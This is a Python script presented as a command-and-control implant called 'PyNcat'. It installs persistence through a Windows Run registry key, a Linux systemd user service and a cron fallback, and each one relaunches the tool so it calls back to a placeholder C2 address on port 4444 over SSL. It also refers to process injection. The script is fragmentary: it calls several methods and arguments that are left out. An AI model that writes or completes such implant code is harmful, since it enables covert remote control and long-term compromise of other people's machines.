#!/usr/bin/env python3
"""
PyNcat - Professional C2 with SSL, Persistence & Process Injection
"""

import argparse
import socket
import subprocess
import sys
import threading
import logging
from pathlib import Path
import time
import random
import ssl
import os
import platform
from typing import Optional, Tuple

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class PyNcat:
    def __init__(self):
        self.args = self.parse_args()
        self.ssl_context: Optional[ssl.SSLContext] = None
        if self.args.ssl:
            self.setup_ssl()

    def parse_args(self):
        parser = argparse.ArgumentParser(description="PyNcat - Professional C2", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-l', '--listen', action='store_true', help='Listen mode')
        group.add_argument('-c', '--connect', type=str, help='Target IP')

        parser.add_argument('-p', '--port', type=int, required=True, help='Port number')
        parser.add_argument('--ssl', action='store_true', help='Enable SSL')
        parser.add_argument('--persistent', action='store_true', help='Enable persistence')
        parser.add_argument('--persist-method', choices=['auto', 'registry', 'cron', 'systemd'], default='auto',
                            help='Persistence method')
        
        # ... (keep your existing arguments: --inject-pid, --file, etc.)

        parser.add_argument('-v', '--verbose', action='store_true')
        return parser.parse_args()

    # ====================== PERSISTENCE ======================
    def install_persistence(self):
        """Install persistence based on OS"""
        if not self.args.persistent:
            return

        system = platform.system().lower()
        logger.info(f"[*] Installing persistence on {system}...")

        if system == "windows":
            self._windows_persistence()
        elif system == "linux":
            self._linux_persistence()
        else:
            logger.warning("[!] Persistence not supported on this OS yet.")

    def _windows_persistence(self):
        """Windows Registry Run Key"""
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            exe_path = os.path.abspath(sys.argv[0])

            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "PyNcat", 0, winreg.REG_SZ, f'"{exe_path}" -c YOUR_C2_IP -p 4444 --ssl --persistent')
            winreg.CloseKey(key)
            logger.info("[+] Windows Registry persistence installed (HKCU\\Run)")
        except Exception as e:
            logger.error(f"Windows persistence failed: {e}")

    def _linux_persistence(self):
        """Linux persistence (cron or systemd)"""
        try:
            # Try systemd user service first
            service_path = f"{os.path.expanduser('~')}/.config/systemd/user/pyncat.service"
            os.makedirs(os.path.dirname(service_path), exist_ok=True)

            service_content = f"""[Unit]
Description=PyNcat Persistent Service

[Service]
ExecStart={os.path.abspath(sys.argv[0])} -c YOUR_C2_IP -p 4444 --ssl --persistent
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""

            with open(service_path, "w") as f:
                f.write(service_content)

            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "--user", "enable", "--now", "pyncat.service"], capture_output=True)
            logger.info("[+] Linux systemd user service persistence installed")
        except:
            # Fallback to cron
            try:
                cron_cmd = f"*/5 * * * * {os.path.abspath(sys.argv[0])} -c YOUR_C2_IP -p 4444 --ssl --persistent"
                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
                logger.info("[+] Linux cron persistence installed")
            except Exception as e:
                logger.error(f"Cron persistence failed: {e}")

    # ====================== RUN ======================
    def run(self):
        # Handle injection first
        if self.args.inject_pid:
            # ... (keep your injection code)
            return

        # Install persistence if requested
        if self.args.persistent:
            self.install_persistence()

        # Normal C2 operation
        if self.args.listen:
            self.listen()
        else:
            if self.args.persistent:
                self.connect_persistent()
            else:
                self.connect_once()


if __name__ == "__main__":
    try:
        pyncat = PyNcat()
        pyncat.run()
    except KeyboardInterrupt:
        print("\n[!] PyNcat terminated.")
    except Exception as e:
        logger.error(f"Critical error: {e}")
